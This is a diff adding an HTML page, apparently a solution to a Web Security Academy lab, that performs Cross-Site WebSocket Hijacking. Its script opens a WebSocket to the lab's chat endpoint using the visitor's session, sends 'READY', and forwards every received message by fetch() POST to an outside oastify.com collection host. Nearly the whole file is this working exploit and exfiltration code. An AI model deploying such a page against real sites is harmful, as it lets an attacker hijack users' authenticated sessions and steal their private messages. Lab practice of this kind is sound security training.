@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Cross-Site WebSocket Hijacking</title>
+</head>
+<body>
+	<h1>Hello hackers !</h1>
+
+	<script type="text/javascript">
+		console.log("Let's CSWH")
+
+		var ws = new WebSocket("wss://0ac2004d04acd6fa80780daf00fb00b9.web-security-academy.net/chat");
+
+		ws.onopen = function() {
+			console.log("We are connected !");
+			ws.send("READY");
+		};
+
+		ws.onmessage = function() {
+			console.log(event.data);
+			fetch('https://ntkr0hojkfsku773drymanpbg2mtajy8.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+		}
+	</script>
+</body>
+</html>
